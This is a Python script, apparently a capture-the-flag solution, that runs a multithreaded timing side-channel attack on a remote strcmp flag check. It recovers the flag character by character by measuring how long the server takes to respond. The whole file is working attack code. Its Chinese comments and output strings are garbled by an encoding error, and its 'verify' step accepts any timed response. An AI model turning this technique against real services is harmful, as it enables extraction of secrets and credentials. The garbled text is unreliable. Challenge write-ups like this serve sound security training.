#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ç®€åŒ–çš„æ—¶é—´ä¾§ä¿¡é“æ”»å‡»è„šæœ¬
ä¸“æ³¨äºå¯é æ€§å’Œç¨³å®šæ€§
"""

import socket
import time
import string
import statistics
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

class SimpleTimingAttacker:
    def __init__(self):
        self.host = "strcmp.chall.edgesecurity.team"
        self.port = 1341
        self.charset = string.ascii_letters + string.digits + "_-!@#$%^&*()"
        self.lock = threading.Lock()
        
    def connect_and_test(self, test_string):
        """å•æ¬¡è¿æ¥æµ‹è¯•"""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(3)
            sock.connect((self.host, self.port))
            
            # æ¸…ç†åˆå§‹å“åº”
            try:
                sock.settimeout(0.3)
                sock.recv(4096)
            except socket.timeout:
                pass
            
            # æµ‹é‡æ—¶é—´
            start_time = time.perf_counter()
            sock.send((test_string + "\n").encode('utf-8'))
            
            try:
                sock.settimeout(1.5)
                response = sock.recv(4096)
            except socket.timeout:
                response = b""
            
            end_time = time.perf_counter()
            elapsed = end_time - start_time
            
            return elapsed if 0.08 < elapsed < 0.15 else None
            
        except Exception:
            return None
        finally:
            if sock:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                    sock.close()
                except:
                    pass
            time.sleep(0.005)  # å°å»¶è¿Ÿé¿å…è¿æ¥å†²çª
    
    def measure_char_timing(self, base_string, char, num_samples=10):
        """æµ‹é‡å•ä¸ªå­—ç¬¦çš„æ—¶é—´"""
        test_string = base_string + char
        times = []
        
        # ä¸²è¡Œæµ‹è¯•ï¼Œé¿å…è¿‡å¤šå¹¶å‘è¿æ¥
        for _ in range(num_samples):
            elapsed = self.connect_and_test(test_string)
            if elapsed is not None:
                times.append(elapsed)
            time.sleep(0.01)  # é—´éš”ç¨å¤§ä¸€äº›
        
        if len(times) >= 3:
            # å»é™¤æå€¼
            times_sorted = sorted(times)
            if len(times) >= 5:
                times = times_sorted[1:-1]
            return statistics.mean(times), len(times)
        
        return None, 0
    
    def bruteforce_position(self, current_flag):
        """çˆ†ç ´å•ä¸ªä½ç½®"""
        print(f"\n{'='*60}")
        print(f"çˆ†ç ´ä½ç½® {len(current_flag)} (å½“å‰: '{current_flag}')")
        print(f"{'='*60}")
        
        char_results = {}
        
        # ä½¿ç”¨é€‚åº¦çš„å¹¶è¡Œåº¦
        with ThreadPoolExecutor(max_workers=8) as executor:
            future_to_char = {
                executor.submit(self.measure_char_timing, current_flag, char): char
                for char in self.charset
            }
            
            completed = 0
            total = len(self.charset)
            
            for future in as_completed(future_to_char):
                char = future_to_char[future]
                avg_time, sample_count = future.result()
                
                if avg_time is not None and sample_count >= 3:
                    char_results[char] = avg_time
                
                completed += 1
                progress = completed / total * 100
                print(f"  [{progress:5.1f}%] å®Œæˆå­—ç¬¦ '{char}': {avg_time:.6f}s (n={sample_count})" if avg_time else f"  [{progress:5.1f}%] å­—ç¬¦ '{char}': æµ‹é‡å¤±è´¥")
        
        if not char_results:
            print("  âŒ æ²¡æœ‰æœ‰æ•ˆçš„æµ‹é‡ç»“æœ")
            return None, 0
        
        # æ’åºç»“æœ
        sorted_chars = sorted(char_results.items(), key=lambda x: x[1], reverse=True)
        
        print(f"\nå‰10ä¸ªå€™é€‰ (åŸºäº {len(char_results)} ä¸ªæœ‰æ•ˆæµ‹é‡):")
        for i, (char, avg_time) in enumerate(sorted_chars[:10], 1):
            print(f"  {i:2d}. '{char}': {avg_time:.6f}s")
        
        best_char = sorted_chars[0][0]
        best_time = sorted_chars[0][1]
        second_best_time = sorted_chars[1][1] if len(sorted_chars) > 1 else 0
        time_diff = best_time - second_best_time
        
        print(f"\n  âœ… æœ€ä½³é€‰æ‹©: '{best_char}' ({best_time:.6f}s)")
        if second_best_time > 0:
            print(f"  ğŸ“Š æ—¶é—´å·®å¼‚: {time_diff:.6f}s ({time_diff/best_time*100:.2f}%)")
        
        return best_char, time_diff
    
    def simple_timing_attack(self):
        """æ‰§è¡Œç®€åŒ–çš„æ—¶é—´ä¾§ä¿¡é“æ”»å‡»"""
        print("=== ç®€åŒ–æ—¶é—´ä¾§ä¿¡é“æ”»å‡» ===")
        
        current_flag = "EdgeCTF{"
        print(f"èµ·å§‹å‰ç¼€: '{current_flag}'")
        print("ä»å¤´å¼€å§‹æ”»å‡»ç›´åˆ°æ‰¾åˆ°}...")
        
        max_length = 60
        
        for position in range(len(current_flag), max_length):
            print(f"\nå½“å‰è¿›åº¦: {position}/{max_length}")
            
            best_char, time_diff = self.bruteforce_position(current_flag)
            
            if best_char is None:
                print("  âŒ çˆ†ç ´å¤±è´¥ï¼Œåœæ­¢æ”»å‡»")
                break
            
            # æ¥å—æœ€ä½³å­—ç¬¦ï¼Œæ— è®ºæ—¶é—´å·®å¼‚å¤§å°
            current_flag += best_char
            print(f"  ğŸš€ æ›´æ–°flag: '{current_flag}'")
            
            if best_char == '}':
                print(f"\nğŸ‰ æ‰¾åˆ°å®Œæ•´flag: {current_flag}")
                break
        
        return current_flag
    
    def verify_flag(self, flag):
        """éªŒè¯flagæ˜¯å¦æ­£ç¡®"""
        print(f"\n{'='*60}")
        print(f"éªŒè¯flag: {flag}")
        print(f"{'='*60}")
        
        elapsed = self.connect_and_test(flag)
        if elapsed:
            print(f"å“åº”æ—¶é—´: {elapsed:.6f}s")
            # ç®€å•éªŒè¯ï¼šä¸ä¾èµ–å“åº”å†…å®¹ï¼Œä»…åŸºäºæ—¶é—´
            return True
        else:
            print("éªŒè¯å¤±è´¥")
            return False

def main():
    print("ç®€åŒ–æ—¶é—´ä¾§ä¿¡é“æ”»å‡» - strcmp(flag)")
    print("=" * 60)
    
    attacker = SimpleTimingAttacker()
    
    # æ‰§è¡Œæ”»å‡»
    found_flag = attacker.simple_timing_attack()
    
    if found_flag:
        print(f"\nğŸ“‹ æ‰¾åˆ°çš„flag: {found_flag}")
        
        # ç®€å•éªŒè¯
        attacker.verify_flag(found_flag)
        
        print(f"\nğŸ¯ æœ€ç»ˆflag: {found_flag}")
    else:
        print("âŒ æœªèƒ½æ‰¾åˆ°flag")

if __name__ == "__main__":
    main()